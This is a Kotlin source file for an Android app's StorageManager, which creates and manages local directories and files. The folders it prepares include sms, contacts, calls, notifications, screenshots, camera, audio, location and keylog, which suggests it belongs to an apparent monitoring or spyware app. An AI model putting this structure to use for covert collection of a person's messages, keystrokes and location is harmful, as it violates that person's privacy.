package com.abuzahra.manager.storage

import android.content.Context
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.util.Log
import com.abuzahra.manager.App
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap

/**
 * StorageManager - Manages local file storage structure
 * Creates and maintains organized directory structure for all data types
 */
object StorageManager {
    
    private const val TAG = "StorageManager"
    
    // Base storage directory
    private lateinit var baseDir: File
    
    // Subdirectories
    private val directories = ConcurrentHashMap<String, File>()
    
    // Directory names
    object Dir {
        const val SMS = "sms"
        const val CONTACTS = "contacts"
        const val CALLS = "calls"
        const val APPS = "apps"
        const val DEVICE = "device"
        const val NOTIFICATIONS = "notifications"
        const val MEDIA = "media"
        const val BACKUPS = "backups"
        const val ARCHIVES = "archives"
        const val CACHE = "cache"
        const val LOGS = "logs"
        const val UPLOADS = "uploads"
        const val DOWNLOADS = "downloads"
        const val SCREENSHOTS = "screenshots"
        const val CAMERA = "camera"
        const val AUDIO = "audio"
        const val VIDEO = "video"
        const val LOCATION = "location"
        const val KEYLOG = "keylog"
    }
    
    /**
     * Initialize storage structure
     */
    fun initialize(context: Context) {
        baseDir = File(context.filesDir, "abu_zahra_data")
        
        // Create all directories
        listOf(
            Dir.SMS, Dir.CONTACTS, Dir.CALLS, Dir.APPS,
            Dir.DEVICE, Dir.NOTIFICATIONS, Dir.MEDIA, Dir.BACKUPS,
            Dir.ARCHIVES, Dir.CACHE, Dir.LOGS, Dir.UPLOADS,
            Dir.DOWNLOADS, Dir.SCREENSHOTS, Dir.CAMERA, Dir.AUDIO,
            Dir.VIDEO, Dir.LOCATION, Dir.KEYLOG
        ).forEach { dirName ->
            val dir = File(baseDir, dirName)
            if (!dir.exists()) {
                dir.mkdirs()
            }
            directories[dirName] = dir
        }
        
        // Create date-based subdirectories
        createDateDirectories()
        
        Log.i(TAG, "Storage initialized at: ${baseDir.absolutePath}")
    }
    
    /**
     * Create date-based subdirectories
     */
    private fun createDateDirectories() {
        val dateFormat = SimpleDateFormat("yyyy-MM", Locale.getDefault())
        val monthDir = dateFormat.format(Date())
        
        listOf(Dir.SCREENSHOTS, Dir.CAMERA, Dir.AUDIO, Dir.VIDEO).forEach { dirName ->
            val dateDir = File(getDirectory(dirName), monthDir)
            if (!dateDir.exists()) {
                dateDir.mkdirs()
            }
        }
    }
    
    /**
     * Get directory by name
     */
    fun getDirectory(name: String): File {
        if (!::baseDir.isInitialized) {
            baseDir = File(App.instance.filesDir, "abu_zahra_data")
            baseDir.mkdirs()
        }
        return directories[name] ?: File(baseDir, name).apply {
            mkdirs()
            directories[name] = this
        }
    }
    
    /**
     * Get file in specific directory
     */
    fun getFile(dirName: String, fileName: String): File {
        return File(getDirectory(dirName), fileName)
    }
    
    /**
     * Create timestamped file
     */
    fun createTimestampedFile(dirName: String, prefix: String, extension: String): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "${prefix}_${timestamp}.${extension}"
        return getFile(dirName, fileName)
    }
    
    /**
     * Get or create today's directory
     */
    fun getTodayDirectory(dirName: String): File {
        val today = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
        val dir = File(getDirectory(dirName), today)
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }
    
    /**
     * Save data to file
     */
    suspend fun saveFile(dirName: String, fileName: String, data: ByteArray): File = withContext(Dispatchers.IO) {
        val file = getFile(dirName, fileName)
        FileOutputStream(file).use { it.write(data) }
        file
    }
    
    /**
     * Save text to file
     */
    suspend fun saveText(dirName: String, fileName: String, text: String): File = withContext(Dispatchers.IO) {
        val file = getFile(dirName, fileName)
        file.writeText(text)
        file
    }
    
    /**
     * Read file as bytes
     */
    suspend fun readFile(dirName: String, fileName: String): ByteArray? = withContext(Dispatchers.IO) {
        val file = getFile(dirName, fileName)
        if (file.exists()) {
            FileInputStream(file).use { it.readBytes() }
        } else null
    }
    
    /**
     * Read file as text
     */
    suspend fun readText(dirName: String, fileName: String): String? = withContext(Dispatchers.IO) {
        val file = getFile(dirName, fileName)
        if (file.exists()) file.readText() else null
    }
    
    /**
     * Delete file
     */
    fun deleteFile(dirName: String, fileName: String): Boolean {
        val file = getFile(dirName, fileName)
        return file.exists() && file.delete()
    }
    
    /**
     * Delete directory contents
     */
    fun clearDirectory(dirName: String): Boolean {
        val dir = getDirectory(dirName)
        return dir.listFiles()?.all { it.deleteRecursively() } ?: true
    }
    
    /**
     * List files in directory
     */
    fun listFiles(dirName: String, extension: String? = null): List<File> {
        val dir = getDirectory(dirName)
        return dir.listFiles()?.filter { 
            extension == null || it.extension == extension 
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }
    
    /**
     * Get storage statistics
     */
    fun getStorageStats(): StorageStats {
        val internalTotal = getTotalSpace(baseDir)
        val internalFree = getFreeSpace(baseDir)
        val usedByApp = calculateDirectorySize(baseDir)
        
        val directoryStats = directories.map { (name, dir) ->
            name to DirectoryStats(
                fileCount = countFiles(dir),
                totalSize = calculateDirectorySize(dir)
            )
        }.toMap()
        
        return StorageStats(
            totalSpace = internalTotal,
            freeSpace = internalFree,
            usedSpace = usedByApp,
            directoryStats = directoryStats
        )
    }
    
    private fun getTotalSpace(file: File): Long {
        return try {
            val stat = StatFs(file.absolutePath)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                stat.totalBytes
            } else {
                @Suppress("DEPRECATION")
                stat.blockCount.toLong() * stat.blockSize
            }
        } catch (e: Exception) {
            0L
        }
    }
    
    private fun getFreeSpace(file: File): Long {
        return try {
            val stat = StatFs(file.absolutePath)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                stat.availableBytes
            } else {
                @Suppress("DEPRECATION")
                stat.availableBlocks.toLong() * stat.blockSize
            }
        } catch (e: Exception) {
            0L
        }
    }
    
    internal fun calculateDirectorySize(dir: File): Long {
        return try {
            dir.walkTopDown().filter { it.isFile }.map { it.length() }.sum()
        } catch (e: Exception) {
            0L
        }
    }
    
    private fun countFiles(dir: File): Int {
        return try {
            dir.walkTopDown().filter { it.isFile }.count()
        } catch (e: Exception) {
            0
        }
    }
    
    /**
     * Calculate MD5 hash of file
     */
    fun calculateMD5(file: File): String? {
        return try {
            val md = MessageDigest.getInstance("MD5")
            FileInputStream(file).use { fis ->
                val buffer = ByteArray(8192)
                var bytesRead: Int
                while (fis.read(buffer).also { bytesRead = it } != -1) {
                    md.update(buffer, 0, bytesRead)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to calculate MD5", e)
            null
        }
    }
    
    /**
     * Check if storage is low
     */
    fun isStorageLow(thresholdMB: Long = 100): Boolean {
        val stats = getStorageStats()
        return stats.freeSpace < (thresholdMB * 1024 * 1024)
    }
    
    /**
     * Get oldest files for cleanup
     */
    fun getOldestFiles(dirName: String, maxAgeDays: Int): List<File> {
        val dir = getDirectory(dirName)
        val cutoffTime = System.currentTimeMillis() - (maxAgeDays * 24 * 60 * 60 * 1000L)
        
        return dir.walkTopDown()
            .filter { it.isFile && it.lastModified() < cutoffTime }
            .sortedBy { it.lastModified() }
            .toList()
    }
    
    /**
     * Clean old files
     */
    fun cleanOldFiles(dirName: String, maxAgeDays: Int): Int {
        val oldFiles = getOldestFiles(dirName, maxAgeDays)
        var deleted = 0
        oldFiles.forEach { file ->
            if (file.delete()) {
                deleted++
            }
        }
        return deleted
    }
    
    data class StorageStats(
        val totalSpace: Long,
        val freeSpace: Long,
        val usedSpace: Long,
        val directoryStats: Map<String, DirectoryStats>
    )
    
    data class DirectoryStats(
        val fileCount: Int,
        val totalSize: Long
    )
}
